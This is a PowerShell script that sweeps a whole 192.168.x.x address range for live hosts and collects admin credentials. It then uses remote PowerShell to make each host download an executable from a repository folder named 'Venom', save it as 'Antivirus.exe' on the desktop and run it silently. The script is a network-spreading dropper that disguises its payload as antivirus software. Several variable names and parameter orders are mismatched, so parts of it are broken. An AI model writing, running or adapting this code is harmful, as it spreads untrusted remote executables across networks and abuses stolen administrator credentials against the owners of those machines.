function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

Set-Variable -Name logFile -Value ("$env:temp\deployment_log.txt")
Set-Variable -Name credentialPath -Value ("$env:USERPROFILE\Documents\adminCreds.xml")
Set-Variable -Name activeIPsFile -Value ("$env:temp\$path\activeips.txt")

function Log-Message {
    param (
        [string]$message
    )
    Set-Variable -Name timestamp -Value (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    Add-Content -Value "[$timestamp] $message" -Path $logFile
}

#Enable-PSRemoting -Force

if ((Get-Service -Name winrm).Status -ne 'Running') {
    Enable-PSRemoting -Force
} else {
    Write-Output "WinRM is already running."
}


function Get-ActiveIPs {
    Set-Variable -Name baseSubnet -Value ("192.168.")
    Set-Variable -Name activeIPs -Value (@())
    for (Set-Variable -Name j -Value (1); $j -le 254; $j++) {
        Set-Variable -Name subnet -Value ($baseSubnet + $j + ".")
        for (Set-Variable -Name i -Value (1); $i -le 254; $i++) {
            Set-Variable -Name ip -Value ($subnet + $i)
            try {
                if (Test-Connection -ComputerName $ip -Count 1 -TimeoutSeconds 5 -Quiet) {
                    $activeIPs += $ip
                    
                }
            }
            catch {
                Log-Message "Failed to ping $ip"
            }
        }
    }
    return $activeIPs

}

Set-Variable -Name wd -Value (random_text)
Set-Variable -Name path -Value ("$env:temp\$wd")
Set-Variable -Name installerUrl -Value ('"https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.exe" -OutFile "AssassinsCreed_SE.exe"')
Set-Variable -Name targets -Value (Get-ActiveIPs)
Set-Variable -Name desktoppath -Value ([Environment]::GetFolderPath("Desktop"))

mkdir $path
cd $path
Add-Content -Value "$ip`n" -Path $activeIPsFile


# if (-not (Test-Path $installerUrl)) {
#     Write-Error "installerUrl not found at $installerUrl"
#     exit
# }

# mkdir $path



# Save credentials securely
Set-Variable -Name cred -Value (Get-Credential)
$cred | Export-Clixml -Path $credentialPath

# Retrieve credentials securely
Set-Variable -Name adminCreds -Value (Import-Clixml -Path $credentialPath)


function Invoke-Retry {
    param (
        [Int]$delay = 5,
        [Management.Automation.ScriptBlock]$scriptblock,
        [Int]$retries = 3
    )

    for (Set-Variable -Name i -Value (1); $i -le $retries; $i++) {
        try {
            & $scriptblock
            return $true
        } catch {
            Log-Message "Attempt $i failed: $_"
            Start-Sleep -Seconds $delay
        }
    }
    return $false
}

Set-Variable -Name maxJobs -Value (10)
Set-Variable -Name jobQueue -Value (@())

foreach ($target in $targets) {
    while ($jobQueue.Count -ge $maxJobs) {
        Set-Variable -Name completedJobs -Value ($jobQueue | Where-Object { $_.State -eq 'Completed' })
        $completedJobs | ForEach-Object {
            Receive-Job -Job $_
            Remove-Job -Job $_
            $jobQueue.Remove($_)
        }
        Start-Sleep -Seconds 1
    }

    Set-Variable -Name job -Value (Start-Job -ArgumentList $installerUrlUrl, $target, $adminCreds -ScriptBlock {
        param ($target, $installerUrlUrl, $adminCreds)
        try {
            Set-Variable -Name randomFolder -Value ([IO.Path]::Combine($env:TEMP, (Get-Random -Count 5 | ForEach-Object { [char]$_ } -join '')))
            New-Item -Path $randomFolder -ErrorAction Stop -ItemType Directory
            Set-Variable -Name installerUrlPath -Value ("$randomFolder\Antivirus.exe")

            Invoke-Command -Credential $using:adminCreds -ArgumentList $installerUrlUrl, $installerUrlPath, $desktoppath -ScriptBlock {
                param ($desktoppath, $installerUrlPath, $installerUrlUrl)
                Invoke-WebRequest -Uri $installerUrlUrl -OutFile $installerUrlPath -ErrorAction Stop
                Copy-Item -Path $installerUrlPath -Destination $desktoppath -ErrorAction Stop
                Start-Process -Wait -FilePath "$desktoppath\Antivirus.exe" -ArgumentList "/silent"
            } -ErrorAction Stop -ComputerName $target
        }
        catch {
            Log-Message "Failed to deploy to $target : $($_)"
        }
    })

    Set-Variable -Name jobQueue -Value ($jobQueue + ($job))
}

# Wait for remaining jobs to complete
while ($jobQueue.Count -gt 0) {
    Set-Variable -Name completedJobs -Value ($jobQueue | Where-Object { $_.State -eq 'Completed' })
    $completedJobs | ForEach-Object {
        Receive-Job -Job $_
        Remove-Job -Job $_
        $jobQueue.Remove($_)
    }
    Start-Sleep -Seconds 1
}

Write-Output "All tasks completed."
